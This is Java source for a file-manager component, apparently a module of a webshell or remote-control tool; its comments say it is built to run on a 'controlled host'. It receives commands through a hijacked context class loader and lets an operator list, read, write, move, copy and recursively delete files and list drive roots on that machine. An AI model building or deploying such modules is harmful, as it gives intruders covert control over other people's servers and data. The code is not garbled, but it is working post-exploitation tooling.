package org.leo.core.component;

import java.io.File;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.UnsupportedEncodingException;
import java.util.ArrayList;
import java.util.HashMap;
import java.util.List;
import java.util.Map;

/**
 * 文件操作组件，提供跨平台的文件和目录操作功能，设计为在被控主机上稳定执行。
 *
 * <p>遵循 COMPONENT_GUIDE.md：Java 1.6 语法，无 lambda/匿名内部类/diamond。
 */
public class FileComponent implements Runnable {

    // 操作类型常量
    private static final int ACTION_LIST_FILES = 1;
    private static final int ACTION_DELETE_FILE = 2;
    private static final int ACTION_CREATE_DIR = 3;
    private static final int ACTION_CREATE_FILE = 4;
    private static final int ACTION_MOVE_FILE = 5;
    private static final int ACTION_LIST_ROOTS = 6;
    private static final int ACTION_EDIT_FILE = 7;
    private static final int ACTION_COPY_FILE = 9;
    private static final int ACTION_GET_FILE_MD5 = 10;

    private static final int MAX_DELETE_DEPTH = 50;                     // 【修复 #2】递归删除最大深度
    private static final long MAX_WRITE_BYTES = 50L * 1024 * 1024;     // 【修复 #5】写入上限 50MB
    private static final int COPY_BUFFER_SIZE = 8192;

    private HashMap params;
    private HashMap results;

    
    public void run() {
        java.lang.reflect.InvocationHandler h = (java.lang.reflect.InvocationHandler) Thread.currentThread().getContextClassLoader();
        try {
            params = (java.util.HashMap) h.invoke(null, null, null);
            results = new java.util.HashMap();
            invoke();
        } catch (Throwable t) {
            if (results == null) results = new java.util.HashMap();
            results.put("code", Integer.valueOf(500));
            results.put("msg", t.getMessage());
        }
        if (results != null) {
            try { h.invoke(null, null, new Object[]{results}); } catch (Throwable ignored) {}
        }
    }


    /**
     * 主要执行方法
     */
    public void invoke() throws Exception {
        handleFile();
    }

    /**
     * 文件操作处理
     */
    private void handleFile() throws Exception {
        // 【修复 #1】使用 Number.intValue() 替代 (Integer) 直接拆箱
        int action = ((Number) params.get("action")).intValue();

        switch (action) {
            case ACTION_LIST_FILES:
                getFileList();
                break;
            case ACTION_DELETE_FILE:
                deleteFile();
                break;
            case ACTION_CREATE_DIR:
                createDirectory();
                break;
            case ACTION_CREATE_FILE:
                createNewFile();
                break;
            case ACTION_MOVE_FILE:
                moveFile();
                break;
            case ACTION_LIST_ROOTS:
                getRootList();
                break;
            case ACTION_EDIT_FILE:
                editFile();
                break;
            case ACTION_COPY_FILE:
                copyFile();
                break;
            case ACTION_GET_FILE_MD5:
                getFileMD5();
                break;
            default:
                throw new IllegalArgumentException("Invalid action: " + action);
        }
    }

    /**
     * 获取文件列表
     */
    private void getFileList() throws Exception {
        String path = getPathFromParams();

        File directory = new File(path);
        if (!directory.exists()) {
            results.put("code", 500);
            results.put("msg", "directory not found: " + path);
            return;
        }

        if (!directory.isDirectory()) {
            results.put("code", 500);
            results.put("msg", "not a directory: " + path);
            return;
        }

        List fileList = new ArrayList();
        File[] files = directory.listFiles();

        if (files != null) {
            for (int i = 0; i < files.length; i++) {
                Map fileInfo = getFileInfoMap(files[i]);
                fileList.add(fileInfo);
            }
        }

        results.put("code", 200);
        results.put("fileList", fileList);
        results.put("absolutePath", directory.getAbsolutePath());
        results.put("count", Integer.valueOf(fileList.size()));
    }

    /**
     * 删除文件
     */
    private void deleteFile() throws Exception {
        String path = getPathFromParams();

        File file = new File(path);
        if (!file.exists()) {
            // 【修复 #8】统一使用 code: 500
            results.put("code", 500);
            results.put("msg", "file not found: " + path);
            return;
        }

        if (file.isDirectory()) {
            // 【修复 #2】符号链接检测：如果目录本身是 symlink，只删链接不递归
            if (isSymbolicLink(file)) {
                boolean success = file.delete();
                results.put("code", success ? 200 : 500);
                results.put("msg", success ? "symlink deleted: " + file.getName()
                        : "failed to delete symlink: " + file.getName());
                return;
            }

            // 【修复 #3】收集删除失败的文件列表
            List failedFiles = new ArrayList();
            boolean success = deleteDirectory(file, 0, failedFiles);

            if (success && failedFiles.isEmpty()) {
                results.put("code", 200);
                results.put("msg", "directory deleted: " + file.getName());
            } else {
                results.put("code", 500);
                results.put("msg", "delete partially failed: " + file.getName());
                if (!failedFiles.isEmpty()) {
                    results.put("failedFiles", failedFiles);
                    results.put("failedCount", Integer.valueOf(failedFiles.size()));
                }
            }
        } else {
            boolean success = file.delete();
            results.put("code", success ? 200 : 500);
            results.put("msg", success ? "deleted: " + file.getName()
                    : "failed to delete: " + file.getName());
        }
    }

    /**
     * 创建目录
     */
    private void createDirectory() throws Exception {
        String path = getPathFromParams();

        File directory = new File(path);
        if (directory.exists()) {
            results.put("code", 500);
            results.put("msg", "directory already exists: " + path);
            return;
        }

        if (directory.mkdirs()) {
            results.put("code", 200);
            results.put("msg", "directory created: " + path);
            results.put("absolutePath", directory.getAbsolutePath());
        } else {
            results.put("code", 500);
            results.put("msg", "failed to create directory: " + path);
        }
    }

    /**
     * 创建新文件
     * 【修复 #7】支持可选 content 参数
     */
    private void createNewFile() throws Exception {
        String path = getPathFromParams();

        File file = new File(path);
        if (file.exists()) {
            results.put("code", 500);
            results.put("msg", "file already exists: " + path);
            return;
        }

        // 确保父目录存在
        File parent = file.getParentFile();
        if (parent != null && !parent.exists()) {
            if (!parent.mkdirs()) {
                results.put("code", 500);
                results.put("msg", "cannot create parent directory: " + parent.getAbsolutePath());
                return;
            }
        }

        if (!file.createNewFile()) {
            results.put("code", 500);
            results.put("msg", "failed to create file: " + path);
            return;
        }

        // 【修复 #7】如果 params 包含 content，写入初始内容
        byte[] content = (byte[]) params.get("content");
        if (content != null && content.length > 0) {
            // 【修复 #5】大小限制
            if (content.length > MAX_WRITE_BYTES) {
                results.put("code", 500);
                results.put("msg", "content too large: " + content.length + " bytes, max: " + MAX_WRITE_BYTES);
                // 文件已创建但不写内容，保持空文件
                return;
            }

            FileOutputStream fos = null;
            try {
                fos = new FileOutputStream(file);
                fos.write(content);
                fos.flush();
            } finally {
                closeResource(fos);
            }
        }

        results.put("code", 200);
        results.put("msg", "file created: " + path);
        results.put("absolutePath", file.getAbsolutePath());
        if (content != null) {
            results.put("size", Integer.valueOf(content.length));
        }
    }

    /**
     * 移动文件
     * 【修复 #4】renameTo 失败后 fallback copy+delete
     * 支持 conflictStrategy: overwrite / autorename / skip（null 保留旧行为）
     */
    private void moveFile() throws Exception {
        String sourcePath = getPathFromParams();
        String newPath = getStringParam("newPath");
        String strategy = getStringParam("conflictStrategy");

        File sourceFile = new File(sourcePath);
        File destFile = new File(newPath);

        if (!sourceFile.exists()) {
            results.put("code", 500);
            results.put("msg", "source not found: " + sourcePath);
            return;
        }

        // 冲突解析
        File resolved = resolveConflict(destFile, strategy);
        if (resolved == null) {
            // skip
            results.put("code", 200);
            results.put("msg", "skipped: target exists: " + destFile.getAbsolutePath());
            results.put("skipped", Boolean.TRUE);
            results.put("newPath", destFile.getAbsolutePath());
            return;
        }
        destFile = resolved;

        // 确保目标目录存在
        File destParent = destFile.getParentFile();
        if (destParent != null && !destParent.exists()) {
            if (!destParent.mkdirs()) {
                results.put("code", 500);
                results.put("msg", "cannot create target directory: " + destParent.getAbsolutePath());
                return;
            }
        }

        // overwrite：先删旧文件（仅支持文件目标，拒绝目录覆盖以防误删整棵树）
        if (!prepareOverwriteIfNeeded(destFile, strategy)) {
            return;
        }

        if (sourceFile.renameTo(destFile)) {
            results.put("code", 200);
            results.put("msg", "moved: " + sourceFile.getName() + " -> " + destFile.getAbsolutePath());
            results.put("newPath", destFile.getAbsolutePath());
            return;
        }

        // 【修复 #4】renameTo 失败（可能跨文件系统），尝试 copy+delete
        if (!sourceFile.isFile()) {
            // 目录的跨分区移动暂不支持 fallback
            results.put("code", 500);
            results.put("msg", "move failed (cross-filesystem directory move not supported): "
                    + sourcePath + " -> " + destFile.getAbsolutePath());
            return;
        }

        // copy
        long totalBytes = copyFileContent(sourceFile, destFile);

        // 保留修改时间
        destFile.setLastModified(sourceFile.lastModified());

        // delete source
        if (sourceFile.delete()) {
            results.put("code", 200);
            results.put("msg", "moved (copy+delete fallback): " + sourceFile.getName() + " -> " + destFile.getAbsolutePath());
            results.put("newPath", destFile.getAbsolutePath());
            results.put("size", Long.valueOf(totalBytes));
        } else {
            // 复制成功但删除源失败
            results.put("code", 200);
            results.put("msg", "copied but source delete failed: " + sourcePath);
            results.put("warning", "source file still exists: " + sourcePath);
            results.put("newPath", destFile.getAbsolutePath());
        }
    }

    /**
     * 获取根目录列表
     */
    private void getRootList() {
        List fileList = new ArrayList();
        File[] roots = File.listRoots();

        if (roots != null) {
            for (int i = 0; i < roots.length; i++) {
                Map fileInfo = getFileInfoMap(roots[i]);
                fileList.add(fileInfo);
            }
        }

        results.put("code", 200);
        results.put("fileList", fileList);
        results.put("absolutePath", "/");
        results.put("count", Integer.valueOf(fileList.size()));
    }

    /**
     * 编辑文件
     * 【修复 #5】增加写入大小限制
     */
    private void editFile() throws Exception {
        String path = getPathFromParams();

        byte[] content = (byte[]) params.get("content");
        if (content == null) {
            results.put("code", 500);
            results.put("msg", "content is null");
            return;
        }

        // 【修复 #5】大小限制
        if (content.length > MAX_WRITE_BYTES) {
            results.put("code", 500);
            results.put("msg", "content too large: " + content.length + " bytes, max: " + MAX_WRITE_BYTES);
            return;
        }

        File file = new File(path);

        // 确保父目录存在
        File parent = file.getParentFile();
        if (parent != null && !parent.exists()) {
            if (!parent.mkdirs()) {
                results.put("code", 500);
                results.put("msg", "cannot create parent directory: " + parent.getAbsolutePath());
                return;
            }
        }

        FileOutputStream fos = null;
        try {
            fos = new FileOutputStream(file);
            fos.write(content);
            fos.flush();
        } finally {
            closeResource(fos);
        }

        results.put("code", 200);
        results.put("msg", "file edited: " + path);
        results.put("size", Integer.valueOf(content.length));
        results.put("absolutePath", file.getAbsolutePath());
    }

    /**
     * 获取文件MD5值
     */
    private void getFileMD5() throws Exception {
        String path = getPathFromParams();

        File file = new File(path);
        if (!file.exists()) {
            results.put("code", 500);
            results.put("msg", "file not found: " + path);
            return;
        }

        if (!file.isFile()) {
            results.put("code", 500);
            results.put("msg", "not a file: " + path);
            return;
        }

        String md5 = calculateFileMD5(file);
        results.put("code", 200);
        results.put("md5", md5);
        results.put("filePath", file.getAbsolutePath());
        results.put("fileSize", Long.valueOf(file.length()));
    }

    /**
     * 复制文件
     * 【修复 #6】保留最后修改时间
     * 支持 conflictStrategy: overwrite / autorename / skip（null 保留旧行为）
     */
    private void copyFile() throws Exception {
        String sourcePath = getPathFromParams();
        String destPath = getStringParam("destPath");
        String strategy = getStringParam("conflictStrategy");

        File sourceFile = new File(sourcePath);
        File destFile = new File(destPath);

        if (!sourceFile.exists()) {
            results.put("code", 500);
            results.put("msg", "source not found: " + sourcePath);
            return;
        }

        if (!sourceFile.isFile()) {
            results.put("code", 500);
            results.put("msg", "source is not a file: " + sourcePath);
            return;
        }

        // 冲突解析
        File resolved = resolveConflict(destFile, strategy);
        if (resolved == null) {
            // skip
            results.put("code", 200);
            results.put("msg", "skipped: target exists: " + destFile.getAbsolutePath());
            results.put("skipped", Boolean.TRUE);
            results.put("newPath", destFile.getAbsolutePath());
            return;
        }
        destFile = resolved;

        // 确保目标目录存在
        File destParent = destFile.getParentFile();
        if (destParent != null && !destParent.exists()) {
            if (!destParent.mkdirs()) {
                results.put("code", 500);
                results.put("msg", "cannot create target directory: " + destParent.getAbsolutePath());
                return;
            }
        }

        // overwrite：FileOutputStream 会自动覆盖文件；若目标是目录则拒绝
        if (!prepareOverwriteIfNeeded(destFile, strategy)) {
            return;
        }

        long totalBytes = copyFileContent(sourceFile, destFile);

        // 【修复 #6】保留最后修改时间
        destFile.setLastModified(sourceFile.lastModified());

        results.put("code", 200);
        results.put("msg", "copied: " + sourceFile.getName() + " -> " + destFile.getAbsolutePath());
        results.put("newPath", destFile.getAbsolutePath());
        results.put("size", Long.valueOf(totalBytes));
    }

    /**
     * overwrite 策略下清理目标位置上的旧文件。
     *
     * 出于安全考虑，仅支持覆盖普通文件；目标若是已存在的目录则拒绝（避免一次"复制/移动"
     * 误删整棵目录树）。其他策略（autorename / skip / null）调用前已经把目标解析成了
     * 不冲突的路径，这里直接放行。
     *
     * @return true 表示可以继续执行；false 表示已写好错误响应，调用方应直接 return
     */
    private boolean prepareOverwriteIfNeeded(File destFile, String strategy) {
        if (!"overwrite".equals(strategy)) {
            return true;
        }
        if (!destFile.exists()) {
            return true;
        }
        if (destFile.isDirectory()) {
            results.put("code", 500);
            results.put("msg", "cannot overwrite directory: " + destFile.getAbsolutePath()
                    + " (target is a directory; please remove it manually first)");
            return false;
        }
        if (!destFile.delete()) {
            results.put("code", 500);
            results.put("msg", "cannot overwrite: " + destFile.getAbsolutePath());
            return false;
        }
        return true;
    }

    /**
     * 解析目标路径上的同名冲突。
     *
     * @param dest     原始目标
     * @param strategy overwrite / autorename / skip / null
     * @return 实际应使用的目标 File；返回 null 表示 skip
     */
    private File resolveConflict(File dest, String strategy) {
        if (dest == null || !dest.exists()) {
            return dest;
        }
        if (strategy == null || strategy.length() == 0 || "overwrite".equals(strategy)) {
            return dest;
        }
        if ("skip".equals(strategy)) {
            return null;
        }
        if ("autorename".equals(strategy)) {
            return autoRename(dest);
        }
        // 未知策略保留旧行为
        return dest;
    }

    /**
     * 在目标同目录下找一个不冲突的名字：foo.txt -> foo (1).txt -> foo (2).txt ...
     * 上限 1000 次，避免极端情况死循环。
     */
    private File autoRename(File dest) {
        File parent = dest.getParentFile();
        String name = dest.getName();
        String base;
        String ext;
        int dot = name.lastIndexOf('.');
        // 仅当点号不在开头才视为扩展名（避免 .bashrc 被切）
        if (dot > 0) {
            base = name.substring(0, dot);
            ext = name.substring(dot);
        } else {
            base = name;
            ext = "";
        }
        for (int i = 1; i <= 1000; i++) {
            File candidate = new File(parent, base + " (" + i + ")" + ext);
            if (!candidate.exists()) {
                return candidate;
            }
        }
        return new File(parent, base + " (" + System.currentTimeMillis() + ")" + ext);
    }

    // ==================== 辅助方法 ====================

    /**
     * 从参数中获取路径
     */
    private String getPathFromParams() throws Exception {
        return getStringParam("path");
    }

    /**
     * 安全获取字符串参数（兼容 String 和 byte[] 两种传入形式）
     */
    private String getStringParam(String key) throws UnsupportedEncodingException {
        Object value = params.get(key);
        if (value == null) {
            return null;
        }
        if (value instanceof String) {
            return (String) value;
        }
        return new String((byte[]) value, "UTF-8");
    }

    /**
     * 复制文件内容（提取公共方法供 copyFile 和 moveFile fallback 使用）
     */
    private long copyFileContent(File source, File dest) throws Exception {
        long totalBytes = 0;
        FileInputStream fis = null;
        FileOutputStream fos = null;
        try {
            fis = new FileInputStream(source);
            fos = new FileOutputStream(dest);
            byte[] buffer = new byte[COPY_BUFFER_SIZE];
            int bytesRead;
            while ((bytesRead = fis.read(buffer)) != -1) {
                fos.write(buffer, 0, bytesRead);
                totalBytes += bytesRead;
            }
            fos.flush();
        } finally {
            closeResource(fis);
            closeResource(fos);
        }
        return totalBytes;
    }

    /**
     * 获取文件信息映射
     */
    private Map getFileInfoMap(File file) {
        Map fileInfo = new HashMap();

        fileInfo.put("name", file.getName());
        fileInfo.put("path", file.getAbsolutePath());
        fileInfo.put("size", Long.valueOf(file.length()));
        fileInfo.put("modified", Long.valueOf(file.lastModified()));
        fileInfo.put("isDirectory", Boolean.valueOf(file.isDirectory()));
        fileInfo.put("isFile", Boolean.valueOf(file.isFile()));
        fileInfo.put("canRead", Boolean.valueOf(file.canRead()));
        fileInfo.put("canWrite", Boolean.valueOf(file.canWrite()));
        fileInfo.put("canExecute", Boolean.valueOf(canExecute(file)));
        fileInfo.put("exists", Boolean.valueOf(file.exists()));

        // 获取文件扩展名
        String fileName = file.getName();
        int lastDotIndex = fileName.lastIndexOf('.');
        if (lastDotIndex > 0) {
            fileInfo.put("extension", fileName.substring(lastDotIndex + 1));
        }
        return fileInfo;
    }

    /**
     * 检查文件是否可执行
     * 兼容 Java 1.5 — 反射调用 canExecute（Java 1.6+）
     */
    private boolean canExecute(File file) {
        try {
            java.lang.reflect.Method method = File.class.getMethod("canExecute");
            Object result = method.invoke(file);
            return ((Boolean) result).booleanValue();
        } catch (NoSuchMethodException e) {
            return false;
        } catch (Exception e) {
            return false;
        }
    }

    /**
     * 【修复 #2】检测是否为符号链接
     * Java 1.6 无 Files.isSymbolicLink()，通过 canonical vs absolute 路径比较近似判断
     */
    private boolean isSymbolicLink(File file) {
        try {
            File parent = file.getParentFile();
            // 先对父目录做 canonical 解析，只比较当前文件名这一层
            File canonical;
            if (parent != null) {
                canonical = new File(parent.getCanonicalFile(), file.getName());
            } else {
                canonical = file;
            }
            return !canonical.getCanonicalPath().equals(canonical.getAbsolutePath());
        } catch (Exception e) {
            // 无法判断时保守认为不是
            return false;
        }
    }

    /**
     * 【修复 #2 + #3】递归删除目录，带深度限制和失败收集
     *
     * @param directory   要删除的目录
     * @param depth       当前递归深度
     * @param failedFiles 删除失败的文件路径列表（输出参数）
     * @return 目录本身是否删除成功
     */
    private boolean deleteDirectory(File directory, int depth, List failedFiles) {
        // 【修复 #2】深度限制
        if (depth > MAX_DELETE_DEPTH) {
            failedFiles.add(directory.getAbsolutePath() + " (max depth exceeded)");
            return false;
        }

        if (!directory.exists()) {
            return true;
        }

        File[] files = directory.listFiles();
        if (files != null) {
            for (int i = 0; i < files.length; i++) {
                File child = files[i];

                // 【修复 #2】如果子项是符号链接，只删链接本身不递归
                if (child.isDirectory() && !isSymbolicLink(child)) {
                    deleteDirectory(child, depth + 1, failedFiles);
                } else {
                    // 【修复 #3】记录删除失败
                    if (!child.delete()) {
                        failedFiles.add(child.getAbsolutePath());
                    }
                }
            }
        }

        boolean deleted = directory.delete();
        if (!deleted) {
            failedFiles.add(directory.getAbsolutePath());
        }
        return deleted;
    }

    /**
     * 计算文件 MD5 值
     */
    private String calculateFileMD5(File file) throws Exception {
        java.security.MessageDigest md = java.security.MessageDigest.getInstance("MD5");
        FileInputStream fis = null;

        try {
            fis = new FileInputStream(file);
            byte[] buffer = new byte[COPY_BUFFER_SIZE];
            int bytesRead;

            while ((bytesRead = fis.read(buffer)) != -1) {
                md.update(buffer, 0, bytesRead);
            }

            byte[] digest = md.digest();
            StringBuilder hexString = new StringBuilder();

            for (int i = 0; i < digest.length; i++) {
                String hex = Integer.toHexString(0xff & digest[i]);
                if (hex.length() == 1) {
                    hexString.append('0');
                }
                hexString.append(hex);
            }

            return hexString.toString();
        } finally {
            closeResource(fis);
        }
    }

    /**
     * 安全关闭资源
     */
    private void closeResource(java.io.Closeable resource) {
        if (resource != null) {
            try {
                resource.close();
            } catch (Exception ignored) {
            }
        }
    }
}
